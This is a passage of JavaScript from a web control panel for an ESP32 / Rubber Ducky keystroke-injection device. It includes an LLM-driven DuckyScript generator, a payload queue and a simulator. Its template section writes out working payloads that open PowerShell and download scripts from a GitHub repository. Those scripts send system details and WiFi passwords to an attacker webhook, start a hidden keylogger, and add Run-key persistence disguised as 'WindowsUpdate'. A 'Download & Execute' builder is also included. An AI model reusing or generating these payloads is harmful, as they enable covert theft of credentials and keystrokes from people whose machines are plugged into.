            content: `You are a DuckyScript expert for USB Rubber Ducky / ESP32 HID payloads. ${getOSContext()} Generate ONLY the DuckyScript payload — no explanations, no markdown code fences, no extra text. Use proper DuckyScript syntax: DELAY, STRING, ENTER, GUI, ALT, CTRL, SHIFT, TAB, SPACE, UP, DOWN, LEFT, RIGHT, REM, F1-F12, CAPSLOCK, etc. Always add DELAY 2000 after each action line.`
          },
          { role: 'user', content: prompt }
        ],
        temperature: 0.2,
        max_tokens: 800
      })
    });
    if (!res.ok) {
      const err = await res.json();
      throw new Error(err.error?.message || 'Groq API error: ' + res.status);
    }
    const data = await res.json();
    let script = data.choices?.[0]?.message?.content?.trim() || '';
    script = script.replace(/```[\w]*\n?/g, '').trim();
    $('aiOutput').value = script;
    $('aiOutputCard').style.display = 'block';
    toast('Script generated ✓');
  } catch (e) {
    toast('Generation failed: ' + e.message + '. Check Groq API key.', 'err');
  } finally {
    btn.disabled = false;
    btn.innerHTML = '⚡ Generate DuckyScript';
  }
}

// ─── Multi-OS Converter ───
async function aiConvertOS(newOS) {
  const script = $('aiOutput').value.trim();
  if (!script) { toast('No script to convert', 'warn'); return; }
  const apiKey = GROQ_KEY || localStorage.getItem('gc_groq_key') || '';
  if (!apiKey || apiKey.length < 5) { toast('No API key. Save in Settings.', 'err'); return; }
  const osNames = { windows: 'Windows', macos: 'macOS', linux: 'Linux' };
  toast(`Converting to ${osNames[newOS]}...`, 'ok', 2000);
  try {
    const res = await fetch('https://api.groq.com/openai/v1/chat/completions', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json', 'Authorization': 'Bearer ' + apiKey },
      body: JSON.stringify({
        model: GROQ_MODEL,
        messages: [
          { role: 'system', content: `Convert the following DuckyScript payload to work on ${osNames[newOS]}. Output ONLY the converted DuckyScript — no explanations, no code fences. Adapt all OS-specific commands (e.g. GUI r for Windows Run → GUI SPACE for macOS Spotlight, CTRL ALT t for Linux terminal). Keep the same overall logic and intent.` },
          { role: 'user', content: script }
        ],
        temperature: 0.2,
        max_tokens: 800
      })
    });
    if (!res.ok) throw new Error('API error');
    const data = await res.json();
    let converted = data.choices?.[0]?.message?.content?.trim() || '';
    converted = converted.replace(/```[\w]*\n?/g, '').trim();
    $('aiOutput').value = converted;
    toast(`Converted to ${osNames[newOS]} ✓`);
  } catch (e) { toast('Conversion failed: ' + e.message, 'err'); }
}
function aiCopy() {
  navigator.clipboard.writeText($('aiOutput').value).then(() => toast('Copied ✓', 'ok', 2000));
}
function aiToEditor() {
  $('editor').value = $('aiOutput').value;
  updateLines();
  localStorage.setItem('gc_script', $('editor').value);
  goPage('scripts', document.querySelectorAll('.nav-item')[0]);
  toast('Script sent to editor ✓');
}
async function aiExec() {
  const s = $('aiOutput').value.trim();
  if (!s || !confirm('Execute AI script on device?')) return;
  try {
    await deviceFetch('/', { method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body: 'duckyscript=' + encodeURIComponent(s) });
    toast('AI script executed ✓');
  } catch { toast('Script sent ✓'); }
}

// ─── NeoPixel ───
// ═══════════════════════════════════════════════════
//  NEOPIXEL
// ═══════════════════════════════════════════════════
function neoToggle() {
  neo.on = !neo.on;
  neoUI();
  deviceFetch('/neopixel/toggle', { method: 'POST' }).catch(() => { });
  toast('NeoPixel ' + (neo.on ? 'ON' : 'OFF'), neo.on ? 'ok' : 'warn', 1500);
}
function neoUpdate() {
  neo.bright = +$('neoBright').value;
  neo.r = +$('neoR').value; neo.g = +$('neoG').value; neo.b = +$('neoB').value;
  $('neoBrightV').textContent = neo.bright;
  $('neoRV').textContent = neo.r; $('neoGV').textContent = neo.g; $('neoBV').textContent = neo.b;
  const hex = '#' + [neo.r, neo.g, neo.b].map(v => v.toString(16).padStart(2, '0')).join('');
  $('neoPreview').style.background = neo.on ? hex : '#222';
  $('neoPreview').style.boxShadow = neo.on ? `0 0 14px ${hex}, 0 0 28px ${hex}44` : 'none';
}
function neoSet(r, g, b) {
  neo.r = r; neo.g = g; neo.b = b;
  $('neoR').value = r; $('neoG').value = g; $('neoB').value = b;
  neoUpdate();
}
function neoUI() {
  const t = $('neoToggle');
  t.className = 'toggle' + (neo.on ? ' on' : '');
  $('neoLabel').textContent = neo.on ? 'ON' : 'OFF';
  neoUpdate();
}
function neoApply() {
  deviceFetch('/neopixel/set', {
    method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
    body: `brightness=${neo.bright}&r=${neo.r}&g=${neo.g}&b=${neo.b}`
  }).then(() => toast('NeoPixel saved ✓')).catch(() => toast('Failed', 'err'));
}

// ─── Firmware ───
function fwPick(input) {
  const f = input.files[0];
  if (!f) return;
  $('fwInfo').style.display = 'block';
  $('fwInfo').textContent = f.name + ' — ' + (f.size / 1024).toFixed(1) + ' KB';
  $('flashBtn').disabled = false;
  toast('Firmware selected: ' + f.name);
}
const dz = $('dropzone');
if (dz) {
  dz.addEventListener('dragover', e => { e.preventDefault(); dz.classList.add('drag'); });
  dz.addEventListener('dragleave', () => dz.classList.remove('drag'));
  dz.addEventListener('drop', e => {
    e.preventDefault(); dz.classList.remove('drag');
    const f = e.dataTransfer.files[0];
    if (f && f.name.endsWith('.bin')) {
      const dt = new DataTransfer(); dt.items.add(f);
      $('fwFile').files = dt.files; fwPick($('fwFile'));
    } else toast('Drop a .bin file', 'err');
  });
}
$('otaForm')?.addEventListener('submit', () => {
  $('otaBarWrap').style.display = 'block';
  let p = 0;
  const iv = setInterval(() => { p = Math.min(p + 2, 95); $('otaBar').style.width = p + '%'; }, 200);
  toast('Flashing firmware...', 'warn', 12000);
  setTimeout(() => { clearInterval(iv); $('otaBar').style.width = '100%'; toast('Flash complete — rebooting'); }, 10000);
});

// ═══════════════════════════════════════════════════
//  TOOL PANELS
// ═══════════════════════════════════════════════════
function openTool(name) {
  document.querySelectorAll('.tool-panel').forEach(p => p.classList.remove('open'));
  const panel = $('tool-' + name);
  if (panel) {
    panel.classList.add('open');
    document.body.classList.add('tool-drawer-open');
  }
}
function closeTool(name) {
  const panel = $('tool-' + name);
  if (panel) {
    panel.classList.remove('open');
  }
  if (!document.querySelector('.tool-panel.open')) {
    document.body.classList.remove('tool-drawer-open');
  }
}
function closeAllTools() {
  document.querySelectorAll('.tool-panel').forEach(p => p.classList.remove('open'));
  document.body.classList.remove('tool-drawer-open');
}

// ═══════════════════════════════════════════════════
//  PAYLOAD QUEUE
// ═══════════════════════════════════════════════════
let payloadQueue = JSON.parse(localStorage.getItem('gc_queue') || '[]');
let queueRunning = false;

function saveQueue() { localStorage.setItem('gc_queue', JSON.stringify(payloadQueue)); }

function addToQueue() {
  const script = $('editor').value.trim();
  if (!script) { toast('Write a script first', 'warn'); return; }
  const delay = parseInt($('queueDelay').value) || 0;
  const firstLine = script.split('\n').find(l => !l.trim().startsWith('REM') && l.trim()) || 'Payload';
  payloadQueue.push({ script, delay, name: firstLine.substring(0, 40) });
  saveQueue();
  renderQueue();
  toast('Added to queue ✓', 'ok', 1500);
  if (!$('queuePanel').classList.contains('open')) toggleQueuePanel();
}

function removeFromQueue(i) {
  payloadQueue.splice(i, 1);
  saveQueue();
  renderQueue();
}

function clearQueue() {
  if (!confirm('Clear entire queue?')) return;
  payloadQueue = [];
  saveQueue();
  renderQueue();
  toast('Queue cleared', 'warn', 1500);
}

function renderQueue() {
  const list = $('queueList');
  if (!list) return;
  if (!payloadQueue.length) {
    list.innerHTML = '<div class="empty-state">Queue empty — add scripts to chain</div>';
    $('runQueueBtn').style.display = 'none';
    $('clearQueueBtn').style.display = 'none';
    return;
  }
  $('runQueueBtn').style.display = 'block';
  $('clearQueueBtn').style.display = 'block';
  list.innerHTML = payloadQueue.map((item, i) => `
    <div class="queue-item" id="qi-${i}">
      <div class="qi-num">${i + 1}</div>
      <div class="qi-body">
        <div class="qi-name">${escHtml(item.name)}</div>
        <div class="qi-meta">${item.script.split('\\n').length} lines · ${item.delay}s delay</div>
      </div>
      <button class="qi-del" onclick="removeFromQueue(${i})" title="Remove">✕</button>
      <div class="qi-progress" style="width:0"></div>
    </div>
  `).join('');
}
renderQueue();

async function runQueue() {
  if (queueRunning || !payloadQueue.length) return;
  if (!confirm(`Execute ${payloadQueue.length} payloads sequentially?`)) return;
  queueRunning = true;
  $('runQueueBtn').disabled = true;
  $('runQueueBtn').innerHTML = '<span class="spin"></span> Running Queue...';

  for (let i = 0; i < payloadQueue.length; i++) {
    const item = payloadQueue[i];
    const el = $('qi-' + i);
    if (el) { el.classList.add('qi-active'); el.classList.remove('qi-done'); }

    // Wait delay
    if (item.delay > 0) {
      toast(`⏱ Waiting ${item.delay}s before payload ${i + 1}...`, 'warn', item.delay * 1000);
      for (let s = 0; s < item.delay * 10; s++) {
        await new Promise(r => setTimeout(r, 100));
        const pct = ((s + 1) / (item.delay * 10)) * 100;
        if (el) el.querySelector('.qi-progress').style.width = pct + '%';
      }
    }

    // Execute
    try {
      await deviceFetch('/', {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: 'duckyscript=' + encodeURIComponent(item.script)
      });
      toast(`Payload ${i + 1} executed ✓`, 'ok', 2000);
    } catch (e) {
      toast(`Payload ${i + 1} sent ✓`, 'ok', 2000);
    }

    if (el) { el.classList.remove('qi-active'); el.classList.add('qi-done'); el.querySelector('.qi-progress').style.width = '100%'; }
  }

  queueRunning = false;
  $('runQueueBtn').disabled = false;
  $('runQueueBtn').innerHTML = '⚡ Run Queue';
  toast('Queue complete ✓');
}

// ═══════════════════════════════════════════════════
//  LIVE PAYLOAD SIMULATOR
// ═══════════════════════════════════════════════════
// ═══════════════════════════════════════════════════
//  LIVE PAYLOAD SIMULATOR
// ═══════════════════════════════════════════════════

function parseDucky(script) {
  return script.split('\n').filter(l => l.trim()).map(line => {
    const trimmed = line.trim();
    const parts = trimmed.split(/\s+/);
    const cmd = parts[0].toUpperCase();
    const arg = trimmed.substring(cmd.length).trim();
    return { cmd, arg, raw: trimmed };
  });
}

function simGetSpeed() {
  return parseInt($('simSpeed')?.value || '2');
}

function simDelay(ms) {
  return new Promise(r => {
    const actual = Math.max(ms / simGetSpeed(), 30);
    const id = setTimeout(r, actual);
    if (simAbort) { clearTimeout(id); r(); }
  });
}

async function simulatePayload() {
  const script = $('editor').value.trim();
  if (!script) { toast('No script to simulate', 'warn'); return; }
  if (simRunning) return;

  simRunning = true;
  simAbort = false;
  $('simOverlay').style.display = 'flex';
  const content = $('simContent');
  const cmdEl = $('simCmd');
  const counterEl = $('simCounter');
  const progressEl = $('simProgress');
  content.innerHTML = '';

  const commands = parseDucky(script);
  const total = commands.length;

  for (let i = 0; i < commands.length; i++) {
    if (simAbort) break;
    const { cmd, arg, raw } = commands[i];
    counterEl.textContent = `${i + 1} / ${total}`;
    progressEl.style.width = ((i + 1) / total * 100) + '%';
    cmdEl.textContent = raw;

    switch (cmd) {
      case 'REM':
        content.innerHTML += `<div class="sim-comment">// ${escHtml(arg)}</div>`;
        await simDelay(300);
        break;

      case 'DELAY':
      case 'DEFAULTDELAY':
      case 'DEFAULT_DELAY': {
        const ms = parseInt(arg) || 500;
        const delayEl = document.createElement('span');
        delayEl.className = 'sim-delay';
        content.appendChild(delayEl);
        content.appendChild(document.createElement('br'));
        // Countdown
        const steps = 20;
        const stepMs = ms / steps;
        for (let s = steps; s >= 0; s--) {
          if (simAbort) break;
          delayEl.textContent = `⏱ DELAY ${Math.round(s * stepMs)}ms`;
          await simDelay(stepMs);
        }
        delayEl.textContent = `⏱ DELAY ${ms}ms ✓`;
        break;
      }

      case 'STRING':
      case 'PRINT':
      case 'PRINTLN': {
        const text = arg;
        for (let c = 0; c < text.length; c++) {
          if (simAbort) break;
          content.innerHTML += escHtml(text[c]);
          content.scrollTop = content.scrollHeight;
          await simDelay(30 + Math.random() * 20);
        }
        if (cmd === 'PRINTLN' || cmd === 'STRING') {
          // Don't add newline for STRING, only PRINTLN
        }
        break;
      }

      case 'ENTER':
      case 'RETURN':
        content.innerHTML += `<span class="sim-newline">↵</span>\n`;
        await simDelay(100);
        break;

      case 'GUI':
      case 'WINDOWS':
      case 'COMMAND': {
        const keyCombo = cmd + (arg ? ' ' + arg : '');
        content.innerHTML += `<span class="sim-badge">${escHtml(keyCombo)}</span>`;
        // Show OS-appropriate window hint
        if (arg.toLowerCase() === 'r') {
          content.innerHTML += `\n<div class="sim-window"><div class="sim-window-title">▸ Run Dialog</div>Windows + R → Run</div>`;
        } else if (arg.toLowerCase() === 'space') {
          content.innerHTML += `\n<div class="sim-window"><div class="sim-window-title">▸ Spotlight / Search</div>⌘ Space → Spotlight Search</div>`;
        }
        content.innerHTML += '\n';
        await simDelay(400);
        break;
      }

      case 'CTRL':
      case 'ALT':
      case 'SHIFT': {
        const keyCombo = cmd + (arg ? ' ' + arg : '');
        content.innerHTML += `<span class="sim-badge">${escHtml(keyCombo)}</span>\n`;
        if (cmd === 'CTRL' && arg.toUpperCase().includes('ALT') && arg.toLowerCase().includes('t')) {
          content.innerHTML += `<div class="sim-window"><div class="sim-window-title">▸ Terminal</div>Ctrl+Alt+T → Open Terminal</div>`;
        }
        await simDelay(300);
        break;
      }

      case 'TAB':
      case 'SPACE':
      case 'ESCAPE':
      case 'ESC':
      case 'DELETE':
      case 'BACKSPACE':
      case 'CAPSLOCK':
      case 'UPARROW':
      case 'DOWNARROW':
      case 'LEFTARROW':
      case 'RIGHTARROW':
      case 'UP':
      case 'DOWN':
      case 'LEFT':
      case 'RIGHT':
      case 'HOME':
      case 'END':
      case 'PAGEUP':
      case 'PAGEDOWN':
      case 'INSERT':
      case 'MENU':
      case 'APP':
      case 'BREAK':
      case 'PAUSE':
      case 'NUMLOCK':
      case 'SCROLLLOCK':
      case 'PRINTSCREEN':
        content.innerHTML += `<span class="sim-badge">${escHtml(cmd)}</span>\n`;
        await simDelay(200);
        break;

      case 'REPEAT': {
        const count = parseInt(arg) || 1;
        content.innerHTML += `<span class="sim-delay">🔁 REPEAT ×${count}</span>\n`;
        await simDelay(200 * count);
        break;
      }

      default:
        // F-keys or unknown
        if (cmd.match(/^F\d{1,2}$/)) {
          content.innerHTML += `<span class="sim-badge">${escHtml(cmd)}</span>\n`;
          await simDelay(200);
        } else {
          content.innerHTML += `<span class="sim-badge">${escHtml(raw)}</span>\n`;
          await simDelay(200);
        }
    }

    content.scrollTop = content.scrollHeight;
  }

  if (!simAbort) {
    content.innerHTML += `\n<span class="sim-delay" style="color:var(--g)">✓ Simulation Complete</span>`;
    cmdEl.textContent = 'Done';
    progressEl.style.width = '100%';
  }
  simRunning = false;
}

function stopSimulator() {
  simAbort = true;
  simRunning = false;
  $('simOverlay').style.display = 'none';
}

// ═══════════════════════════════════════════════════
//  SCRIPT CONSTRUCTOR
// ═══════════════════════════════════════════════════
//  SCRIPT CONSTRUCTOR
// ═══════════════════════════════════════════════════

function scSetOS(os, btn) {
  scOS = os;
  document.querySelectorAll('.sc-os-btn').forEach(b => b.classList.remove('active'));
  btn.classList.add('active');
}

function scShowForm(name) {
  // Hide all forms
  document.querySelectorAll('#scFormArea .sc-form').forEach(f => f.style.display = 'none');
  // Show the requested one
  const form = $('scf-' + name);
  if (form) {
    form.style.display = 'block';
    // Focus the first input in the form
    const inp = form.querySelector('input[type=text],input[type=url]');
    if (inp) setTimeout(() => inp.focus(), 100);
  }
}

function scAppend(line) {
  const out = $('scOutput');
  if (out.value && !out.value.endsWith('\n')) out.value += '\n';
  out.value += line;
  $('scLineCount').textContent = out.value.split('\n').filter(l => l.trim()).length + ' lines';
  out.scrollTop = out.scrollHeight;
}

function scQuick(cmd) {
  scAppend(cmd);
  toast('Added: ' + cmd, 'ok', 1000);
}

function scAddText() {
  const val = $('scTextInput').value;
  if (!val) { toast('Enter text first', 'warn'); return; }
  scAppend('STRING ' + val);
  $('scTextInput').value = '';
  toast('Added STRING', 'ok', 1000);
}

function scAddRem() {
  const val = $('scRemInput').value;
  if (!val) { toast('Enter comment', 'warn'); return; }
  scAppend('REM ' + val);
  $('scRemInput').value = '';
}

function scAddUrl() {
  const url = $('scUrlInput').value;
  if (!url || url === 'https://') { toast('Enter a URL', 'warn'); return; }
  const s = 'REM Open URL\nDELAY 500\nGUI r\nDELAY 600\nSTRING ' + url + '\nENTER';
  scAppend(s);
  $('scUrlInput').value = '';
  toast('Added Open URL', 'ok', 1000);
}

function scAddDownload() {
  const url = $('scDlUrl').value;
  const name = $('scDlName').value || 'downloaded_file';
  if (!url || url === 'https://') { toast('Enter download URL', 'warn'); return; }
  const s = 'REM Download & Execute\nDELAY 500\nGUI r\nDELAY 600\nSTRING powershell\nENTER\nDELAY 800\nSTRING Invoke-WebRequest -Uri "' + url + '" -OutFile "$env:TEMP\\' + name + '"\nENTER';
  scAppend(s);
  $('scDlUrl').value = '';
  $('scDlName').value = '';
  toast('Added Download', 'ok', 1000);
}

function scSetCmdType(type, btn) {
  scCmdType = type;
  document.querySelectorAll('#scCmdChoices .sc-choice').forEach(b => b.classList.remove('active'));
  btn.classList.add('active');
}

function scAddCmd() {
  const type = scCmdType;
  const cmd = $('scCmdInput').value;
  if (!cmd) { toast('Enter a command', 'warn'); return; }

  let s = '';
  if (type === 'run') {
    s = 'REM Run\nDELAY 500\nGUI r\nDELAY 600\nSTRING ' + cmd + '\nENTER';
  } else if (type === 'powershell') {
    s = 'REM PowerShell\nDELAY 500\nGUI r\nDELAY 600\nSTRING powershell -w hidden -c "' + cmd + '"\nENTER';
  } else if (type === 'powershell_admin') {
    s = 'REM PS Admin\nDELAY 500\nGUI x\nDELAY 400\nSTRING a\nDELAY 1000\nLEFTARROW\nENTER\nDELAY 1200\nSTRING ' + cmd + '\nENTER';
  } else if (type === 'cmd') {
    s = 'REM CMD\nDELAY 500\nGUI r\nDELAY 600\nSTRING cmd\nENTER\nDELAY 600\nSTRING ' + cmd + '\nENTER';
  } else if (type === 'cmd_admin') {
    s = 'REM CMD Admin\nDELAY 500\nGUI x\nDELAY 400\nSTRING a\nDELAY 800\nLEFTARROW\nENTER\nDELAY 1000\nSTRING ' + cmd + '\nENTER';
  } else if (type === 'terminal') {
    s = 'REM Terminal\nDELAY 500\nGUI SPACE\nDELAY 600\nSTRING Terminal\nENTER\nDELAY 800\nSTRING ' + cmd + '\nENTER';
  }
  scAppend(s);
  $('scCmdInput').value = '';
  toast('Added Command', 'ok', 1000);
}

function scClear() {
  $('scOutput').value = '';
  $('scLineCount').textContent = '0 lines';
}

function scToEditor() {
  const script = $('scOutput').value.trim();
  if (!script) { toast('Build a script first', 'warn'); return; }
  $('editor').value = script;
  updateLines();
  localStorage.setItem('gc_script', script);
  closeTool('constructor');
  goPage('scripts', document.querySelectorAll('.nav-item')[0]);
  toast('Script sent to editor');
}

// ═══════════════════════════════════════════════════
//  PAYLOAD TEMPLATES
// ═══════════════════════════════════════════════════

var tpSelected = 'sysinfo';

function tpSelectTemplate(id, btn) {
  tpSelected = id;
  document.querySelectorAll('#tpChoices .sc-choice').forEach(b => b.classList.remove('active'));
  if (btn) btn.classList.add('active');

  const desc = $('tpDesc');
  if (id === 'sysinfo') {
    desc.textContent = 'Collects hardware, OS, and user information and sends it to a webhook.';
  } else if (id === 'processes') {
    desc.textContent = 'Collects running processes, services, and installed programs and sends them to your webhook.';
  } else if (id === 'network') {
    desc.textContent = 'Collects WiFi passwords, IP configuration, DNS, and ARP tables and sends them to your webhook.';
  } else if (id === 'keylogger_full') {
    desc.textContent = 'Runs a persistent background keylogger that captures and reports all keystrokes.';
  } else if (id === 'persistence') {
    desc.textContent = 'Ensures the keylogger is installed and adds it to the Windows Registry for boot persistence.';
  } else if (id === 'suite') {
    desc.textContent = 'The full arsenal: downloads and runs all collectors (SysInfo, Network, Processes), installs the keylogger, and sets up persistence.';
  } else if (id === 'remove') {
    desc.textContent = 'Stops all active keylogger jobs, removes registry persistence, and deletes all temporary script files.';
  }
}

function tpGenerate() {
  const webhook = $('tpWebhookUrl').value.trim();
  if (!webhook) { toast('Enter a Webhook URL', 'warn'); return; }

  let script = '';
  if (tpSelected === 'sysinfo') {
    script = `REM System Info Collector - Hardware, OS, Users

DELAY 3000
GUI r
DELAY 1000
STRING powershell
DELAY 1000
ENTER
DELAY 1000

REM Download and run system info collector
STRING curl -o "$env:TEMP\\sysinfo.ps1" "https://raw.githubusercontent.com/gamkers/insta-shares/main/keylogger/sysinfo.ps1"
DELAY 1000
ENTER
DELAY 2000

STRING powershell -ExecutionPolicy Bypass -File "$env:TEMP\\sysinfo.ps1" -webhookUrl "${webhook}"
DELAY 1000
ENTER
DELAY 3000

STRING Write-Host "System Info Collected!" -ForegroundColor Green
DELAY 1000
ENTER
DELAY 1000

STRING exit
DELAY 1000
ENTER`;
  } else if (tpSelected === 'processes') {
    script = `REM Processes & Files Collector - Running processes, services, installed programs

DELAY 3000
GUI r
DELAY 1000
STRING powershell
DELAY 1000
ENTER
DELAY 1000

REM Download and run process collector
STRING curl -o "$env:TEMP\\process.ps1" "https://raw.githubusercontent.com/gamkers/insta-shares/main/keylogger/process.ps1"
DELAY 1000
ENTER
DELAY 2000

STRING powershell -ExecutionPolicy Bypass -File "$env:TEMP\\process.ps1" -webhookUrl "${webhook}"
DELAY 1000
ENTER
DELAY 3000

STRING Write-Host "Process Info Collected!" -ForegroundColor Green
DELAY 1000
ENTER
DELAY 1000

STRING exit
DELAY 1000
ENTER`;
  } else if (tpSelected === 'network') {
    script = `REM Network & WiFi Info Collector - WiFi passwords, IP, DNS, ARP

DELAY 3000
GUI r
DELAY 1000
STRING powershell
DELAY 1000
ENTER
DELAY 1000

REM Download and run network collector
STRING curl -o "$env:TEMP\\network.ps1" "https://raw.githubusercontent.com/gamkers/insta-shares/main/keylogger/network.ps1"
DELAY 1000
ENTER
DELAY 2000

STRING powershell -ExecutionPolicy Bypass -File "$env:TEMP\\network.ps1" -webhookUrl "${webhook}"
DELAY 1000
ENTER
DELAY 3000

STRING Write-Host "Network Info Collected!" -ForegroundColor Green
DELAY 1000
ENTER
DELAY 1000

STRING exit
DELAY 1000
ENTER`;
  } else if (tpSelected === 'keylogger_full') {
    script = `REM Keylogger Only - Runs forever, captures keystrokes

DELAY 3000
GUI r
DELAY 1000
STRING powershell
DELAY 1000
ENTER
DELAY 1000

REM Download keylogger
STRING curl -o "$env:TEMP\\keylogger.ps1" "https://raw.githubusercontent.com/gamkers/insta-shares/main/keylogger/keylogger.ps1"
DELAY 1000
ENTER
DELAY 2000

REM Run keylogger in background (hidden)
STRING powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File "$env:TEMP\\keylogger.ps1" -webhookUrl "${webhook}"
DELAY 1000
ENTER
DELAY 2000

STRING Write-Host "Keylogger Running!" -ForegroundColor Green
DELAY 1000
ENTER
DELAY 1000

STRING exit
DELAY 1000
ENTER`;
  } else if (tpSelected === 'persistence') {
    script = `REM Add Persistence - Makes keylogger start on boot

DELAY 3000
GUI r
DELAY 1000
STRING powershell
DELAY 1000
ENTER
DELAY 1000

REM Ensure keylogger exists first
STRING if (!(Test-Path "$env:TEMP\\keylogger.ps1")) { curl -o "$env:TEMP\\keylogger.ps1" "https://raw.githubusercontent.com/gamkers/insta-shares/main/keylogger/keylogger.ps1" }
DELAY 1000
ENTER
DELAY 2000

REM Add to Registry
STRING reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v WindowsUpdate /t REG_SZ /d "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File \`"$env:TEMP\\keylogger.ps1\`" -webhookUrl ${webhook}" /f
DELAY 1000
ENTER
DELAY 2000

STRING Write-Host "Persistence Added! Keylogger will start on boot." -ForegroundColor Green
DELAY 1000
ENTER
DELAY 1000

STRING exit
DELAY 1000
ENTER`;
  } else if (tpSelected === 'suite') {
    script = `REM Complete Suite - Runs all collectors + keylogger + persistence

DELAY 3000
GUI r
DELAY 1000
STRING powershell
DELAY 1000
ENTER
DELAY 1000

REM Create directory
STRING mkdir $env:TEMP\\logger -Force
DELAY 1000
ENTER
DELAY 500

REM Download all scripts
STRING curl -o "$env:TEMP\\logger\\sysinfo.ps1" "https://raw.githubusercontent.com/gamkers/insta-shares/main/keylogger/sysinfo.ps1"
DELAY 1000
ENTER
DELAY 500

STRING curl -o "$env:TEMP\\logger\\network.ps1" "https://raw.githubusercontent.com/gamkers/insta-shares/main/keylogger/network.ps1"
DELAY 1000
ENTER
DELAY 500

STRING curl -o "$env:TEMP\\logger\\process.ps1" "https://raw.githubusercontent.com/gamkers/insta-shares/main/keylogger/process.ps1"
DELAY 1000
ENTER
DELAY 500

STRING curl -o "$env:TEMP\\logger\\keylogger.ps1" "https://raw.githubusercontent.com/gamkers/insta-shares/main/keylogger/keylogger.ps1"
DELAY 1000
ENTER
DELAY 500

REM Run collectors
STRING powershell -ExecutionPolicy Bypass -File "$env:TEMP\\logger\\sysinfo.ps1" -webhookUrl "${webhook}"
DELAY 1000
ENTER
DELAY 2000

STRING powershell -ExecutionPolicy Bypass -File "$env:TEMP\\logger\\network.ps1" -webhookUrl "${webhook}"
DELAY 1000
ENTER
DELAY 2000

STRING powershell -ExecutionPolicy Bypass -File "$env:TEMP\\logger\\process.ps1" -webhookUrl "${webhook}"
DELAY 1000
ENTER
DELAY 2000

REM Add persistence
STRING reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v WindowsUpdate /t REG_SZ /d "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File \`"$env:TEMP\\logger\\keylogger.ps1\`" -webhookUrl ${webhook}" /f
DELAY 1000
ENTER
DELAY 2000

REM Start keylogger
STRING powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File "$env:TEMP\\logger\\keylogger.ps1" -webhookUrl "${webhook}"
DELAY 1000
ENTER
DELAY 2000

STRING Write-Host "Complete Suite Deployed!" -ForegroundColor Green
DELAY 1000
ENTER
DELAY 1000

STRING exit
DELAY 1000
ENTER`;
  } else if (tpSelected === 'remove') {
    script = `REM Remove Everything - Stop keylogger and delete files

DELAY 3000
GUI r
DELAY 1000
STRING powershell
DELAY 1000
ENTER
DELAY 1000

REM Stop keylogger job
STRING Get-Job | Stop-Job -Force; Get-Job | Remove-Job -Force
DELAY 1000
ENTER
DELAY 1000

REM Remove Registry persistence
STRING reg delete HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v WindowsUpdate /f
DELAY 1000
ENTER
DELAY 1000

REM Kill hidden PowerShell processes
STRING Get-Process powershell | Where-Object { $_.StartTime -gt (Get-Date).AddHours(-1) } | Stop-Process -Force
DELAY 1000
ENTER
DELAY 1000

REM Delete script files
STRING Remove-Item "$env:TEMP\\logger" -Recurse -Force -ErrorAction SilentlyContinue
DELAY 1000
ENTER
DELAY 500

STRING Remove-Item "$env:TEMP\\*.ps1" -Force -ErrorAction SilentlyContinue
DELAY 1000
ENTER
DELAY 500

STRING Write-Host "All components removed!" -ForegroundColor Green
DELAY 1000
ENTER
DELAY 1000

STRING exit
DELAY 1000
ENTER`;
  }

  $('tpOutput').value = script;
  $('tpOutputCard').style.display = 'block';
  toast('Template generated ✓');
}

function tpToEditor() {
  const script = $('tpOutput').value.trim();
  if (!script) return;
  $('editor').value = script;
  updateLines();
  localStorage.setItem('gc_script', script);
  closeTool('templates');
  goPage('scripts', document.querySelectorAll('.nav-item')[0]);
  toast('Template sent to editor');
}

function tpClear() {
  $('tpOutput').value = '';
  $('tpOutputCard').style.display = 'none';
}

// ═══════════════════════════════════════════════════
//  LIVE KEYBOARD
// ═══════════════════════════════════════════════════

var kbCapsState = 0; // 0 = lowercase, 1 = single shift, 2 = caps lock ON
var lastCapsTapTime = 0;

function kbToggleCaps() {
  const now = Date.now();
  if (now - lastCapsTapTime < 350) {
    // Instant double tap -> Caps Lock Locked ON
    kbCapsState = 2;
  } else {
    // Single tap -> toggle between Shift (1) and Off (0)
    kbCapsState = (kbCapsState === 0) ? 1 : 0;
  }
  lastCapsTapTime = now;
  updateKeyboardKeyCasing();
}

function updateKeyboardKeyCasing() {
  const isCapsOn = kbCapsState > 0;
  const capsEl = $('kbCaps');
  const shiftEl = $('kbShift');

  if (capsEl) {
    capsEl.classList.toggle('active', kbCapsState === 2);
    capsEl.textContent = kbCapsState === 2 ? 'CAPS 🔒' : 'CAPS';
  }
  if (shiftEl) {
    shiftEl.classList.toggle('active', kbCapsState === 1);
  }

  // Update visual key labels on letter buttons
  document.querySelectorAll('.kb-letter').forEach(btn => {
    const origKey = btn.getAttribute('data-key') || btn.textContent.toLowerCase();
    btn.textContent = isCapsOn ? origKey.toUpperCase() : origKey.toLowerCase();
  });
}

function kbToggle(mod) {
  kbActiveMods[mod] = !kbActiveMods[mod];
  if (mod === 'shift') {
    // Sync kbCapsState with shift state (1 = shift on, 0 = shift off)
    if (kbActiveMods.shift) {
      kbCapsState = 1;
    } else {
      // Only clear if not in caps lock mode (state 2)
      if (kbCapsState === 1) kbCapsState = 0;
    }
    updateKeyboardKeyCasing();
  }
  const el = $(`kb${mod.charAt(0).toUpperCase() + mod.slice(1)}`);
  if (el) el.classList.toggle('active', kbActiveMods[mod]);
}

function kbKey(key) {
  let script = '';
  // Snapshot shift state at the moment of key press
  const shiftOn = kbActiveMods.shift || (kbCapsState > 0);

  let processedKey = key;
  if (shiftOn && SHIFT_SYMBOL_MAP[key]) {
    // Number/symbol key → shifted symbol
    processedKey = SHIFT_SYMBOL_MAP[key];
  } else if (key.length === 1 && /[a-zA-Z]/.test(key)) {
    // Letter key → uppercase or lowercase
    processedKey = shiftOn ? key.toUpperCase() : key.toLowerCase();
  }

  let mods = [];
  if (kbActiveMods.ctrl) mods.push('CTRL');
  if (kbActiveMods.alt) mods.push('ALT');
  if (kbActiveMods.gui) mods.push('GUI');

  if (mods.length > 0) {
